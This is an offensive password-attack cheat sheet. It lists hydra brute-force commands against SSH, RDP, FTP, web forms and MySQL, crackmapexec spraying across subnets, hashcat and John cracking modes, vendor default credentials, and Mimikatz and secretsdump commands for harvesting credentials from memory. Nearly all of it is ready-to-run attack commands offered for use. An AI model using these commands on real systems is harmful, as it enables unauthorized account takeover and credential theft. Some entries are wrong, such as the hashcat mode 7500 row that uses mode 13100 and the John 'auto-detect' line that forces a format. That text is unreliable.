# Password Attack Reference

## Attack Types

### Online Attacks (Direct)
| Type | Tool | Speed | Lockout Risk |
|---|---|---|---|
| Brute force | hydra_brute | Fast | High |
| Password spray | crackmapexec | Slow | Medium |
| Credential stuffing | hydra_brute | Medium | High |
| Default creds | crackmapexec | Fast | Low |
| Rainbow tables | — | Instant | None |

### Offline Attacks (Post-Hash)
| Type | Tool | Hash Type |
|---|---|---|
| Dictionary | hashcat | All |
| Rule-based | hashcat + rules | All |
| Mask/Brute-force | hashcat -a 3 | All |
| Hybrid | hashcat -a 6/7 | All |
| Combinator | hashcat -a 1 | All |

## Hashcat Modes

| Mode | Hash Type | Command |
|---|---|---|
| 0 | MD5 | `hashcat -m 0 hash.txt wordlist.txt` |
| 100 | SHA1 | `hashcat -m 100 hash.txt wordlist.txt` |
| 1400 | SHA-256 | `hashcat -m 1400 hash.txt wordlist.txt` |
| 1800 | sha512crypt | `hashcat -m 1800 hash.txt wordlist.txt` |
| 3200 | bcrypt | `hashcat -m 3200 hash.txt wordlist.txt` |
| 5500 | NetNTLMv1 | `hashcat -m 5500 hash.txt wordlist.txt` |
| 5600 | NetNTLMv2 | `hashcat -m 5600 hash.txt wordlist.txt` |
| 7500 | Kerberoast TGS | `hashcat -m 13100 hash.txt wordlist.txt` |
| 13100 | Kerberoast TGS | `hashcat -m 13100 hash.txt wordlist.txt` |
| 18200 | AS-REP | `hashcat -m 18200 hash.txt wordlist.txt` |

## Hydra Attack Commands

### SSH
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target ssh -t 16 -W 3
```

### RDP
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt target rdp -t 1
```

### FTP
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target ftp -t 16
```

### HTTP Form (POST)
```bash
# Detect form fields first
nikto -h target

# Attack
hydra -l admin -P wordlist.txt target http-form-post "/login.php:username=^USER^&password=^PASS^:Login Failed"
```

### HTTP Form (GET)
```bash
hydra -l admin -P wordlist.txt target http-get "/admin/:Username:^USER^&Password:^PASS^:S=logout"
```

### MySQL
```bash
hydra -l root -P wordlist.txt target mysql -t 16
```

### SMB
```bash
crackmapexec smb target -u admin -p password
crackmapexec smb target -u admin -p password --sam
```

## CrackMapExec Spraying

```bash
# Single credential spray
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123'

# User list spray
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Company2024!'

# Password list spray (with delay)
crackmapexec ssh 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# With domain
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password1' -d CORP
```

## Password Strategy

### Default Passwords by Vendor
| Vendor | Default User | Default Pass |
|---|---|---|
| Windows | Administrator | (empty) |
| Linux | root | (empty or root) |
| MySQL | root | (empty) |
| PostgreSQL | postgres | (empty) |
| Cisco | admin | admin |
| Fortinet | admin | (empty) |
| SonicWall | admin | password |
| Tomcat | tomcat | tomcat |
| Weblogic | weblogic | Oracle123 |
| Jenkins | admin | admin |

### Seasonal Passwords
```
Company2024!, Company2024, Spring2024!, Summer2024!
Company!2024, Welcome2024!, Password2024!
```

### Rule-Based Patterns
```
# Capitalize + add numbers
Password → Password1, Password12, Password123

# Add symbols
password → Password!, Password1!, Password1@!

# Leet speak
password → p@ssw0rd, P@ssw0rd, P@$$w0rd!

# Keyboard walk
qwerty, asdfgh, zxcvbn, 1qaz2wsx
```

## Wordlist Locations (Kali)

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## John the Ripper

```bash
# Auto-detect hash type
john --format=raw-md5 hash.txt

# With wordlist
john --wordlist=rockyou.txt hash.txt

# Format-specific
john --format=netntlmv2 hash.txt
john --format=kerberos5 hash.txt
```

## Credential Harvesting from Memory

```bash
# Mimikatz (Windows)
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::lsa

# Impacket (Linux)
impacket-secretsdump target/user:pass@10.10.10.1
impacket-secretsdump -hashes :da76... target/user@10.10.10.1
```
